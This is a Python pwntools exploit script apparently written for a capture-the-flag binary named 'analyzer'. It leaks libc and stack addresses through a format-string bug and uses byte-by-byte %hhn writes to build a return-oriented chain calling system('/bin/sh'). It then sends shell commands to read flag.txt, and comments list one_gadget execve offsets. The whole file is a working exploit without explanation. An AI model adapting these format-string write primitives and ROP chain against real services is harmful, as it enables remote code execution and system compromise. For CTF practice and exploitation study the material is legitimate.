from pwn import *
context(terminal=['tmux','splitw','-h'])

io=process('./analyzer')
#io=remote("chal.osugaming.lol",7273)
elf=ELF('./analyzer')
libc=elf.libc

gdb.attach(io,'b *0x4018d9\nc\n')
# pause()

def fi(s,n):
    payload =  b"\x00\xFB\xD6\x34\x01\x0B\x20\x32\x65\x61\x37\x32\x32\x31\x38\x65"
    payload += b"\x35\x36\x38\x30\x66\x33\x62\x63\x31\x65\x32\x39\x36\x66\x63\x64"
    payload += b"\x62\x37\x36\x33\x32\x39\x36\x0B"
    payload += '{}{}'.format(s,n).encode()
    payload += b"\x0B\x20\x66\x63\x36\x64\x63\x33\x64\x61\x62\x65\x30\x64\x63\x34"
    payload += b"\x65\x30\x35\x62\x33\x64\x65\x63\x32\x33\x39\x36\x64\x31\x30\x34"
    payload += b"\x32\x33\xDF\x02\x06\x00\x00\x00\xC0\x00\x05\x00\x00\x00\x32\x35"
    payload += b"\x3A\x01\x4C\x04\x01\x28\x00\x00\x00\x0b"
    return payload

payload=fi('\x05','%51$p')
io.sendlineafter(b":\n",payload.hex())

io.recvuntil(b"name: ")
leak_addr=int(io.recv(14),16)-0x29d90
log.success("leak_addr:"+hex(leak_addr))

shell=leak_addr+0xebc81
log.success("shell:"+hex(shell))

pop_rdi=leak_addr+0x000000000002a3e5
ret=leak_addr+0x0000000000029139
leave_ret=leak_addr+0x000000000004da83
str_sh=leak_addr+next(libc.search(b"/bin/sh"))
sys_addr=leak_addr+libc.sym[b"system"]

bss_addr=0x404400

def ab_write(content,addr):
    for i in range(6):
        tp='%{}c%16$hhn'.format((content>>(8*i))&0xff).ljust(0x10,'a')+p64(addr+i).decode('latin-1')
        slen=len(tp)
        log.success("slen:"+hex(slen))
        payload=fi('\x18',tp)
        io.sendlineafter(b":\n",payload.hex())

# ab_write(shell,0x404070)
# ab_write(pop_rdi,bss_addr)
# ab_write(str_sh,bss_addr+8)
# ab_write(sys_addr,bss_addr+16)

## leak stack
payload=fi('\x04','%6$p')
io.sendlineafter(b":\n",payload.hex())
io.recvuntil(b"name: ")
stack_addr=int(io.recv(14),16)
log.success("stack_addr:"+hex(stack_addr))
ret_addr=stack_addr-0x110


# gdb.attach(io,'b *0x401686\nc')
# pause()

ab_write(pop_rdi,bss_addr)
ab_write(str_sh,bss_addr+0x8)
ab_write(sys_addr,bss_addr+0x10)

# gdb.attach(io,'')
# pause()

def fmt_t(addr,ctt,off1,off2):
    tp="%{}c%{}$hn".format(addr&0xffff,off1).ljust(0x20,'a')
    slen=len(tp)
    log.success("slen:"+hex(slen))
    payload=fi('\x20',tp)
    io.sendlineafter(b":\n",payload.hex())
      
    for i in range(6):
        tp="%{}c%{}$hhn".format((addr+i)&0xff,off1).ljust(0x20,'a')
        slen=len(tp)
        log.success("slen:"+hex(slen))
        payload=fi('\x20',tp)
        io.sendlineafter(b":\n",payload.hex())
        
        tp1="%{}c%{}$hhn".format((ctt>>((i)*8))&0xff,off2).ljust(0x20,'a')
        slen=len(tp1)
        log.success("slen:"+hex(slen))
        payload=fi('\x20',tp1)
        io.sendlineafter(b":\n",payload.hex())
        

# def fmt_t(addr,ctt,off1,off2):
#     io.sendafter(b":\n","%{}c%{}$hn".format(addr&0xffff,off1).hex())
#     io.sendafter(b":\n","%{}c%{}$hhn".format(ctt&0xff,off2).hex())
    
#     for i in range(5):
#         io.sendafter(b":\n","%{}c%{}$hhn".format((addr+i+1)&0xff,off1))
#         io.sendafter(b":\n","%{}c%{}$hhn".format((ctt>>((i+1)*8))&0xff,off2))


fmt_t(ret_addr+0x8,pop_rdi,6,85)
fmt_t(ret_addr+0x10,str_sh,6,85)
fmt_t(ret_addr+0x18,sys_addr,6,85)
fmt_t(ret_addr,ret,6,85)

log.success("stack_addr:"+hex(stack_addr))
log.success("ret_addr:"+hex(ret_addr))
log.success("str_sh:"+hex(str_sh))
log.success("pop_rdi:"+hex(pop_rdi))

io.sendlineafter(b":\n",b"ls")
io.sendline(b"cat flag.txt")





io.interactive()


# 0xebc81 execve("/bin/sh", r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL || r10 is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# 0xebc85 execve("/bin/sh", r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL || r10 is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp

# 0xebc88 execve("/bin/sh", rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL || rsi is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp

# 0xebce2 execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp

# 0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# 0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   rax == NULL || {rax, r12, NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# 0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
